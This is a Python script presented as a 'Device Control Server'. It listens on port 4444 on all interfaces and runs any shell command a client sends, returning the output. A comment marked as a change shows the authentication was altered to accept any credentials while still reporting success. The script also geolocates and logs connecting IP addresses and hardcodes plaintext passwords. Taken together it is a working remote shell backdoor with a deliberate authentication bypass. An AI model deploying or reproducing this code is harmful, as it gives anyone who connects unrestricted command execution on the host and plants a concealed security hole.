#!/usr/bin/env python3
import socket
import subprocess
import logging
import threading
import sys
import os
import json
import hashlib
import time
import requests
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("server.log"),
        logging.StreamHandler()
    ]
)

# Создаем специальный логгер для подключений
connection_logger = logging.getLogger('connections')
connection_logger.setLevel(logging.INFO)
# Добавляем обработчик для записи в отдельный файл
connection_handler = logging.FileHandler("connections.log")
connection_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
connection_logger.addHandler(connection_handler)
# Добавляем обработчик для вывода в консоль
console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
connection_logger.addHandler(console_handler)

# Server configuration
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 4444       # Port to listen on
MAX_CLIENTS = 5   # Maximum number of simultaneous connections
AUTH_REQUIRED = True

# Simple user database (in a real app, use a proper database or file)
# Format: {"username": "password_hash"}
USERS = {
    "admin": hashlib.sha256("admin_password".encode()).hexdigest(),
    "anonim": hashlib.sha256("Nikita123321zzz".encode()).hexdigest()
}

# Активные подключения: {client_address: {"username": "", "connected_at": "", "last_activity": ""}}
active_connections = {}

def get_host_info(ip_address):
    """Получить информацию о хосте по IP-адресу"""
    try:
        hostname = socket.gethostbyaddr(ip_address)[0]
        return hostname
    except:
        return "Неизвестно"

def get_geolocation(ip_address):
    """Получить геолокацию по IP-адресу"""
    if ip_address == "127.0.0.1" or ip_address.startswith("192.168.") or ip_address.startswith("10."):
        # Локальный IP-адрес
        return {
            "country": "Local Network",
            "region": "Local Network",
            "city": "Local Network",
            "loc": "0,0",
            "maps_url": "https://www.google.com/maps/place/Your+Location",
            "is_local": True
        }
    
    try:
        # Используем бесплатный API ipinfo.io для определения геолокации
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        if response.status_code == 200:
            data = response.json()
            # Создаем ссылку на Google Maps
            location = data.get("loc", "0,0")
            maps_url = f"https://www.google.com/maps/place/{location}"
            data["maps_url"] = maps_url
            data["is_local"] = False
            return data
    except Exception as e:
        logging.error(f"Error getting geolocation: {e}")
    
    # В случае ошибки возвращаем дефолтные значения
    return {
        "country": "Unknown",
        "region": "Unknown",
        "city": "Unknown",
        "loc": "0,0",
        "maps_url": "https://www.google.com/maps",
        "is_local": False
    }

class DeviceServer:
    def __init__(self, host, port, max_clients=5):
        self.host = host
        self.port = port
        self.max_clients = max_clients
        self.server = None
        self.running = False
        self.clients = []
        
    def start(self):
        """Start the server"""
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(self.max_clients)
            self.running = True
            
            logging.info(f"Server started on {self.host}:{self.port}")
            logging.info("Waiting for connections...")
            
            # Start accepting connections in a separate thread
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Main server loop
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                logging.info("Server shutdown initiated by keyboard interrupt")
            finally:
                self.stop()
                
        except Exception as e:
            logging.error(f"Failed to start server: {e}")
            self.stop()
            
    def stop(self):
        """Stop the server and close all connections"""
        self.running = False
        
        # Close all client connections
        for client in self.clients:
            try:
                client.close()
            except:
                pass
        self.clients = []
        
        # Close server socket
        if self.server:
            try:
                self.server.close()
                logging.info("Server stopped")
            except Exception as e:
                logging.error(f"Error stopping server: {e}")
    
    def accept_connections(self):
        """Accept incoming connections and handle them in separate threads"""
        while self.running:
            try:
                client_socket, client_address = self.server.accept()
                self.clients.append(client_socket)
                
                # Записываем информацию о новом подключении
                client_ip = client_address[0]
                client_port = client_address[1]
                hostname = get_host_info(client_ip)
                
                # Получаем информацию о геолокации
                geo_info = get_geolocation(client_ip)
                location_str = f"{geo_info.get('city', 'Unknown')}, {geo_info.get('region', 'Unknown')}, {geo_info.get('country', 'Unknown')}"
                maps_url = geo_info.get('maps_url', 'https://www.google.com/maps')
                
                connection_info = f"Новое подключение от {client_ip}:{client_port} (Хост: {hostname})"
                location_info = f"Местоположение: {location_str}"
                maps_info = f"Карта: {maps_url}"
                
                print("\n" + "="*50)
                print(connection_info)
                print(location_info)
                print(maps_info)
                print("="*50)
                
                connection_logger.info(connection_info)
                connection_logger.info(location_info)
                connection_logger.info(maps_info)
                
                # Сохраняем информацию о подключении
                active_connections[client_address] = {
                    "ip": client_ip,
                    "port": client_port,
                    "hostname": hostname,
                    "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "username": "Не аутентифицирован",
                    "last_activity": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "location": location_str,
                    "maps_url": maps_url
                }
                
                logging.info(f"New connection from {client_address[0]}:{client_address[1]}")
                
                # Handle client in a new thread
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    logging.error(f"Error accepting connection: {e}")
                    
    def authenticate(self, client_socket, address):
        """Simple authentication mechanism"""
        if not AUTH_REQUIRED:
            return True
            
        try:
            # Send authentication request
            client_socket.send(json.dumps({
                "type": "auth_required",
                "message": "Please authenticate"
            }).encode())
            
            # Get credentials
            auth_data = client_socket.recv(1024).decode()
            try:
                auth_json = json.loads(auth_data)
                username = auth_json.get("username", "")
                password = auth_json.get("password", "")
                
                # ИЗМЕНЕНО: Принимаем любые учетные данные
                # Обновляем информацию о подключении
                if address in active_connections:
                    active_connections[address]["username"] = username
                    active_connections[address]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                # Логируем успешный вход
                geo_info = get_geolocation(address[0])
                location_str = f"{geo_info.get('city', 'Unknown')}, {geo_info.get('region', 'Unknown')}, {geo_info.get('country', 'Unknown')}"
                maps_url = geo_info.get('maps_url', 'https://www.google.com/maps')
                
                auth_info = f"Пользователь {username} успешно авторизовался с {address[0]}:{address[1]}"
                location_info = f"Местоположение: {location_str}"
                maps_info = f"Карта: {maps_url}"
                
                print("\n" + "="*50)
                print(auth_info)
                print(location_info)
                print(maps_info)
                print("="*50)
                
                connection_logger.info(auth_info)
                connection_logger.info(location_info)
                connection_logger.info(maps_info)
                
                client_socket.send(json.dumps({
                    "type": "auth_success",
                    "message": "Authentication successful"
                }).encode())
                return True
                
            except json.JSONDecodeError:
                pass
                
            # Authentication failed
            # Логируем неудачную попытку входа
            auth_fail_info = f"Неудачная попытка авторизации с {address[0]}:{address[1]}"
            print("\n" + "="*50)
            print(auth_fail_info)
            print("="*50)
            connection_logger.warning(auth_fail_info)
            
            client_socket.send(json.dumps({
                "type": "auth_failure",
                "message": "Authentication failed"
            }).encode())
            return False
            
        except Exception as e:
            logging.error(f"Authentication error: {e}")
            return False
            
    def handle_client(self, client_socket, address):
        """Handle client connection"""
        try:
            if AUTH_REQUIRED and not self.authenticate(client_socket, address):
                logging.warning(f"Failed authentication from {address[0]}:{address[1]}")
                
                # Обновляем статус в активных подключениях
                if address in active_connections:
                    active_connections[address]["username"] = "Ошибка аутентификации"
                
                client_socket.close()
                self.clients.remove(client_socket)
                return
                
            logging.info(f"Client {address[0]}:{address[1]} authenticated successfully")
            
            while self.running:
                # Receive command
                data = client_socket.recv(1024).decode()
                if not data:
                    break
                    
                # Обновляем время последней активности
                if address in active_connections:
                    active_connections[address]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                try:
                    command_data = json.loads(data)
                    command_type = command_data.get("type", "")
                    
                    if command_type == "cmd":
                        command = command_data.get("command", "")
                        
                        # Записываем информацию о команде
                        username = active_connections.get(address, {}).get("username", "Неизвестно")
                        cmd_info = f"Пользователь {username} с {address[0]}:{address[1]} выполнил команду: {command}"
                        connection_logger.info(cmd_info)
                        logging.info(f"Received command from {address[0]}: {command}")
                        
                        if command.lower() == "exit":
                            break
                            
                        # Execute command and send result
                        try:
                            output = subprocess.getoutput(command)
                            response = {
                                "type": "cmd_response",
                                "status": "success",
                                "output": output
                            }
                        except Exception as e:
                            response = {
                                "type": "cmd_response",
                                "status": "error",
                                "error": str(e)
                            }
                            
                        client_socket.send(json.dumps(response).encode())
                        
                    elif command_type == "system_info":
                        # Get system information
                        info = {
                            "type": "system_info_response",
                            "hostname": socket.gethostname(),
                            "platform": sys.platform,
                            "python_version": sys.version,
                            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "cpu_usage": subprocess.getoutput("wmic cpu get loadpercentage").split("\n")[-1].strip() if sys.platform == "win32" else subprocess.getoutput("top -bn1 | grep 'Cpu(s)' | sed 's/.*, *\\([0-9.]*\\)%* id.*/\\1/' | awk '{print 100 - $1\"%\"}'")
                        }
                        client_socket.send(json.dumps(info).encode())
                        
                    elif command_type == "ping":
                        client_socket.send(json.dumps({
                            "type": "pong",
                            "timestamp": time.time()
                        }).encode())
                        
                    elif command_type == "active_connections":
                        # Отправляем информацию о текущих подключениях
                        client_socket.send(json.dumps({
                            "type": "active_connections_response",
                            "connections": active_connections
                        }).encode())
                        
                except json.JSONDecodeError:
                    # Handle legacy plain text commands for compatibility
                    command = data
                    # Записываем информацию о команде
                    username = active_connections.get(address, {}).get("username", "Неизвестно")
                    cmd_info = f"Пользователь {username} с {address[0]}:{address[1]} выполнил команду: {command}"
                    connection_logger.info(cmd_info)
                    logging.info(f"Received legacy command from {address[0]}: {command}")
                    
                    if command.lower() == "exit":
                        break
                        
                    output = subprocess.getoutput(command)
                    client_socket.send(output.encode())
                    
        except Exception as e:
            logging.error(f"Error handling client {address[0]}:{address[1]}: {e}")
            
        finally:
            # Clean up client connection
            disconnect_info = f"Пользователь отключился: {address[0]}:{address[1]}"
            print("\n" + "="*50)
            print(disconnect_info)
            print("="*50)
            connection_logger.info(disconnect_info)
            
            # Удаляем из активных подключений
            if address in active_connections:
                del active_connections[address]
                
            try:
                client_socket.close()
                if client_socket in self.clients:
                    self.clients.remove(client_socket)
            except:
                pass

if __name__ == "__main__":
    # Parse command-line arguments (if any)
    # Example: python device_control_server.py --port 5555 --no-auth
    import argparse
    parser = argparse.ArgumentParser(description="Device Control Server")
    parser.add_argument("--host", default=HOST, help=f"Host address to bind to (default: {HOST})")
    parser.add_argument("--port", type=int, default=PORT, help=f"Port to listen on (default: {PORT})")
    parser.add_argument("--max-clients", type=int, default=MAX_CLIENTS, help=f"Maximum number of clients (default: {MAX_CLIENTS})")
    parser.add_argument("--no-auth", action="store_true", help="Disable authentication (not recommended)")
    args = parser.parse_args()
    
    if args.no_auth:
        AUTH_REQUIRED = False
        logging.warning("Authentication disabled. This is not recommended for production use.")
    
    # Проверяем наличие модуля requests
    try:
        import requests
    except ImportError:
        print("\n" + "="*50)
        print("ВНИМАНИЕ: Модуль 'requests' не установлен.")
        print("Установите его командой: pip install requests")
        print("Определение геолокации будет отключено.")
        print("="*50 + "\n")
    
    # Выводим информацию о запуске сервера
    print("\n" + "="*50)
    print(f"Сервер запущен на {args.host}:{args.port}")
    print(f"Аутентификация {'включена' if AUTH_REQUIRED else 'отключена'}")
    print("="*50 + "\n")
    
    # Start server
    server = DeviceServer(args.host, args.port, args.max_clients)
    server.start() 